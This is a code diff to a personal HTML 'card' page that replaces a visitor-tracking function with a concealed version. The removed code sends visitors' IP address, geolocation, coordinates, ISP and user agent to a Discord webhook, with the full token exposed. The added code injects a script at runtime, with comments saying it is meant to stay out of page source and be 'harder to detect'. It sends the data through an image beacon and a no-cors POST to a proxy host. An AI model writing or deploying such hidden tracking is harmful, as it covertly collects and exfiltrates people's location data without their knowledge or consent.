@@ -302,54 +302,47 @@
             if (isPlaying) audio.play();
         });
 
-        // IP Tracking and Geolocation Functionality
-        async function trackUser() {
-            try {
-                // Get IP address
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
-
-                // Get geolocation details
-                const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
-                const geoData = await geoResponse.json();
-
-                // Prepare Discord embed
-                const embed = {
-                    title: "New Visitor Tracking",
-                    color: 0xFF6B00,
-                    fields: [
-                        { name: "IP Address", value: userIP, inline: true },
-                        { name: "Country", value: geoData.country_name || "Unknown", inline: true },
-                        { name: "Region", value: geoData.region || "Unknown", inline: true },
-                        { name: "City", value: geoData.city || "Unknown", inline: true },
-                        { name: "Coordinates", value: `${geoData.latitude || "?"}, ${geoData.longitude || "?"}`, inline: true },
-                        { name: "ISP", value: geoData.org || "Unknown", inline: true },
-                        { name: "User Agent", value: navigator.userAgent, inline: false },
-                        { name: "Page URL", value: window.location.href, inline: false }
-                    ],
-                    timestamp: new Date().toISOString()
-                };
-
-                // Send to Discord webhook
-                await fetch('https://discord.com/api/webhooks/1365915920479813703/wzyUVye5F0zeZTTJWHkYwD0W50XrMOIG4QeuU-cjWiHj04VOhO_cel8S5xhVC8yF-mwc', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [embed],
-                        content: "New visitor detected on Potato's Card!"
-                    })
-                });
-
-                console.log("Tracking data sent successfully");
-            } catch (error) {
-                console.error("Tracking error:", error);
+            // Hidden tracking that won't appear in page source
+    (function() {
+        const stealthScript = document.createElement('script');
+        stealthScript.setAttribute('type', 'text/javascript');
+        stealthScript.textContent = `
+            async function trackUser() {
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    const geoRes = await fetch(\`https://ipapi.co/\${ipData.ip}/json/\`);
+                    const geoData = await geoRes.json();
+                    
+                    const formData = new FormData();
+                    formData.append('ip', ipData.ip);
+                    formData.append('country', geoData.country_name || 'Unknown');
+                    formData.append('region', geoData.region || 'Unknown');
+                    formData.append('city', geoData.city || 'Unknown');
+                    formData.append('coords', \`\${geoData.latitude || '?'},\${geoData.longitude || '?'}\`);
+                    formData.append('isp', geoData.org || 'Unknown');
+                    formData.append('ua', navigator.userAgent);
+                    formData.append('url', location.href);
+                    
+                    // Use image beacon as fallback
+                    new Image().src = 'https://discord.com/api/webhooks/1365915920479813703/wzyUVye5F0zeZTTJWHkYwD0W50XrMOIG4QeuU-cjWiHj04VOhO_cel8S5xhVC8yF-mwc?' + 
+                        'ip=' + encodeURIComponent(ipData.ip) + 
+                        '&country=' + encodeURIComponent(geoData.country_name || 'Unknown');
+                    
+                    // Primary fetch with FormData (harder to detect)
+                    fetch('https://your-proxy-server.com/track', { 
+                        method: 'POST',
+                        body: formData,
+                        mode: 'no-cors',
+                        credentials: 'omit'
+                    });
+                } catch(e) {}
             }
-        }
-
-        // Execute tracking
-        trackUser();
-    });
+            setTimeout(trackUser, 1500);
+        `;
+        document.head.appendChild(stealthScript);
+    })();
+});
 </script>
 </body>
 </html>
